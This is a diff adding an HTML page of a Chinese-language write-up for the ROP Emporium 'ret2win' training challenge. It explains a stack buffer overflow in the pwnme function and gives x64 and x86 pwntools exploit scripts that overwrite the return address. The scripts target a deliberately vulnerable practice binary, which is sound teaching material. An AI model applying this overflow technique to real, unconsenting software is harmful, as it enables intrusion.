@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="zh-CN" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ret2win &mdash; rop emporium writeup  文档</title>
+      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/translations.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="索引" href="../genindex.html" />
+    <link rel="search" title="搜索" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+            <a href="../index.html" class="icon icon-home"> rop emporium writeup
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="在文档中搜索" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <!-- Local TOC -->
+              <div class="local-toc"><ul>
+<li><a class="reference internal" href="#">ret2win</a><ul>
+<li><a class="reference internal" href="#no-spoilers-here">No spoilers here</a></li>
+<li><a class="reference internal" href="#what-am-i-doing">What am I doing</a></li>
+<li><a class="reference internal" href="#double-check">Double check</a></li>
+<li><a class="reference internal" href="#let-s-do-this">Let’s do this</a></li>
+<li><a class="reference internal" href="#x64">X64</a></li>
+<li><a class="reference internal" href="#x86">X86</a></li>
+</ul>
+</li>
+</ul>
+</div>
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">rop emporium writeup</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
+      <li>ret2win</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/0_ret2win/README.md.txt" rel="nofollow"> 查看页面源码</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="ret2win">
+<h1>ret2win<a class="headerlink" href="#ret2win" title="永久链接至标题"></a></h1>
+<p>via：https://ropemporium.com/challenge/ret2win.html</p>
+<p>Locate a method within the binary that you want to call and do so by overwriting a saved return address on the stack.
+Click below to download the binary.</p>
+<p><a class="reference external" href="https://ropemporium.com/binary/ret2win.zip">64bit</a> <a class="reference external" href="https://ropemporium.com/binary/ret2win32.zip">32bit</a></p>
+<section id="no-spoilers-here">
+<h2>No spoilers here<a class="headerlink" href="#no-spoilers-here" title="永久链接至标题"></a></h2>
+<p>Take the time to read these challenge pages, there aren’t any spoilers and they contain important information that could save you some frustration. If you’re unfamiliar with ROP tools of the trade then check out the <a class="reference external" href="https://ropemporium.com/guide.html">beginner’s guide</a>. As it states; you’ll feed each binary with a quantity of garbage followed by your ROP chain. In this case there is a <strong>magic method</strong> we want to call and we’ll do so by overwriting a saved return address on the stack. Certainly nothing that could be called a ‘chain’ by any stretch of the imagination but we’ve got to start somewhere. We’ll do a little RE to confirm some information but nothing serious.</p>
+</section>
+<section id="what-am-i-doing">
+<h2>What am I doing<a class="headerlink" href="#what-am-i-doing" title="永久链接至标题"></a></h2>
+<p>These challenges use the usual CTF objective of retrieving the contents of a file named “flag.txt” from a remote machine by exploiting a given binary. The two most common courses of action are to somehow read flag.txt back to us directly or drop a shell and read it yourself. Let’s see if ret2win has an easy way to do either of these. We’ll use the following nm one-liner to check method names. <code class="docutils literal notranslate"><span class="pre">nm</span> <span class="pre">ret2win|grep</span> <span class="pre">'</span> <span class="pre">t</span> <span class="pre">'</span></code> will tell us that the suspiciously named function ‘ret2win’ is present and r2 confirms that it will cat the flag back to us:</p>
+<p><img alt="ret2win function" src="../_images/ret2win_ret2win.png" /></p>
+</section>
+<section id="double-check">
+<h2>Double check<a class="headerlink" href="#double-check" title="永久链接至标题"></a></h2>
+<p>For a quick and dirty confirmation of how many bytes are needed to cause an overflow in the 64bit binary you can use <code class="docutils literal notranslate"><span class="pre">sudo</span> <span class="pre">dmesg</span> <span class="pre">-C</span></code> to clear the kernel ring buffer, run the program and type 40 characters followed by 5 capital Xs (why let the As have all the fun) then type <code class="docutils literal notranslate"><span class="pre">dmesg</span> <span class="pre">-t</span></code> to see output that hopefully looks similar to the sample below:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ret2win</span><span class="p">[</span><span class="mi">14987</span><span class="p">]:</span> <span class="n">segfault</span> <span class="n">at</span> <span class="n">a5858585858</span> <span class="n">ip</span> <span class="mi">00000</span><span class="n">a5858585858</span> <span class="n">sp</span> <span class="mi">00007</span><span class="n">ffe8c93d4e0</span> <span class="n">error</span> <span class="mi">14</span> <span class="ow">in</span> <span class="n">libc</span><span class="o">-</span><span class="mf">2.24</span><span class="o">.</span><span class="n">so</span><span class="p">[</span><span class="mi">7</span><span class="n">fef0e075000</span><span class="o">+</span><span class="mi">195000</span><span class="p">]</span>
+</pre></div>
+</div>
+<p>It’s worth confirming this before each challenge but typically you’ll need 40 bytes of garbage to reach the saved return address in the 64bit binaries and 44 bytes in the 32bit binaries.</p>
+</section>
+<section id="let-s-do-this">
+<h2>Let’s do this<a class="headerlink" href="#let-s-do-this" title="永久链接至标题"></a></h2>
+<p>You can solve this challenge with a variety of tools, even the echo command will work, although pwntools is suggested. If you decided to go for a more complex exploit than a ret2win then be aware that input is truncated for these simpler challenges. Find out how many bytes you have to construct your chain in each challenge using <code class="docutils literal notranslate"><span class="pre">ltrace</span> <span class="pre">&lt;binary&gt;</span></code> and looking at the call to fgets(). If your ROP chain seems perfect but the binary is crashing before printing the flag see the [common pitfalls](https://ropemporium.com/guide.html#Common pitfalls) section of the beginner’s guide, especially if you’re using <strong>Ubuntu 18.04</strong>.</p>
+<p>上面是官方 ret2win 页面的描述</p>
+<p>直接入手吧</p>
+</section>
+<section id="x64">
+<h2>X64<a class="headerlink" href="#x64" title="永久链接至标题"></a></h2>
+<p><img alt="image-20200430001415853" src="../_images/image-20200430001415853.png" /></p>
+<p>直接看 <code class="docutils literal notranslate"><span class="pre">pwnme</span></code> 函数</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">void</span> <span class="nf">pwnme</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">local_28</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+  
+  <span class="n">memset</span><span class="p">(</span><span class="n">local_28</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x20</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span>
+      <span class="s">&quot;For my first trick, I will attempt to fit 50 bytes of user input into 32 bytes of stackbuffer;</span><span class="se">\n</span><span class="s">What could possibly go wrong?&quot;</span>
+      <span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span>
+      <span class="s">&quot;You there madam, may I have your input please? And don</span><span class="se">\&#39;</span><span class="s">t worry about null bytes, we</span><span class="se">\&#39;</span><span class="s">reusing fgets!</span><span class="se">\n</span><span class="s">&quot;</span>
+      <span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;&gt; &quot;</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="n">local_28</span><span class="p">,</span><span class="mh">0x32</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>看起来没有什么大问题</p>
+<p>但是看汇编</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>004007f6 48 8b 15        MOV        RDX,qword ptr [stdin]
+         73 08 20 00
+004007fd 48 8d 45 e0     LEA        RAX=&gt;local_28,[RBP + -0x20]
+00400801 be 32 00        MOV        ESI,0x32
+         00 00
+00400806 48 89 c7        MOV        RDI,RAX
+00400809 e8 12 fe        CALL       fgets                                            
+         ff ff
+0040080e 90              NOP
+0040080f c9              LEAVE
+00400810 c3              RET
+</pre></div>
+</div>
+<p>看到了吗，往 <code class="docutils literal notranslate"><span class="pre">[RBP</span> <span class="pre">+</span> <span class="pre">-0x20]</span></code> 写入 <code class="docutils literal notranslate"><span class="pre">0x32</span></code> Bytes</p>
+<p>溢出了，能覆盖到 <code class="docutils literal notranslate"><span class="pre">RBP</span> <span class="pre">+</span> <span class="pre">8</span></code> （返回地址）</p>
+<p>要填充 <code class="docutils literal notranslate"><span class="pre">0x20</span> <span class="pre">+</span> <span class="pre">0x8</span> <span class="pre">=</span> <span class="pre">028</span></code></p>
+<p>然后我们要跳转到 <code class="docutils literal notranslate"><span class="pre">ret2win</span></code> 函数</p>
+<p><img alt="image-20200430002412161" src="../_images/image-20200430002412161.png" /></p>
+<p>假惺惺的用 <code class="docutils literal notranslate"><span class="pre">nm</span></code> 看 <code class="docutils literal notranslate"><span class="pre">ret2win</span></code> 的 <code class="docutils literal notranslate"><span class="pre">plt</span></code></p>
+<p><img alt="image-20200430002526158" src="../_images/image-20200430002526158.png" /></p>
+<p><code class="docutils literal notranslate"><span class="pre">0x0000000000400811</span></code></p>
+<p>payload：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./ret2win&quot;</span><span class="p">)</span>
+<span class="n">ret2win</span> <span class="o">=</span> <span class="mh">0x0000000000400811</span>
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret2win</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p><img alt="image-20200430002935202" src="../_images/image-20200430002935202.png" /></p>
+<p>pwn!</p>
+</section>
+<section id="x86">
+<h2>X86<a class="headerlink" href="#x86" title="永久链接至标题"></a></h2>
+<p>在 <code class="docutils literal notranslate"><span class="pre">pwnme</span></code> 函数里面，也是一样的漏洞</p>
+<p>其实这个跟上面的差不多，区别就在于 x86 在调用函数时是用栈来函数</p>
+<p><img alt="image-20200430003445466" src="../_images/image-20200430003445466.png" /></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>08048648 6a 32           PUSH       0x32
+0804864a 8d 45 d8        LEA        EAX=&gt;local_2c,[EBP + -0x28]
+0804864d 50              PUSH       EAX
+0804864e e8 bd fd        CALL       fgets                                            
+         ff ff
+</pre></div>
+</div>
+<p>计算填充长度<code class="docutils literal notranslate"><span class="pre">0x28</span> <span class="pre">+</span> <span class="pre">0x4</span> <span class="pre">=</span> <span class="pre">0x2c</span></code> 这个 <code class="docutils literal notranslate"><span class="pre">0x4</span></code> 是 <code class="docutils literal notranslate"><span class="pre">ebp</span></code> 的长度</p>
+<p><img alt="image-20200430003627761" src="../_images/image-20200430003627761.png" /></p>
+<p><code class="docutils literal notranslate"><span class="pre">ret2win</span></code> 的地址：<code class="docutils literal notranslate"><span class="pre">0x08048659</span></code></p>
+<p>Payload:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./ret2win32&quot;</span><span class="p">)</span>
+<span class="n">ret2win</span> <span class="o">=</span> <span class="mh">0x08048659</span>
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x2c</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret2win</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p><img alt="image-20200430004126231" src="../_images/image-20200430004126231.png" /></p>
+<p>pwn!</p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; 版权所有 2021, scriptk1d.</p>
+  </div>
+
+  利用 <a href="https://www.sphinx-doc.org/">Sphinx</a> 构建，使用了 
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">主题</a>
+    由 <a href="https://readthedocs.org">Read the Docs</a>开发.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
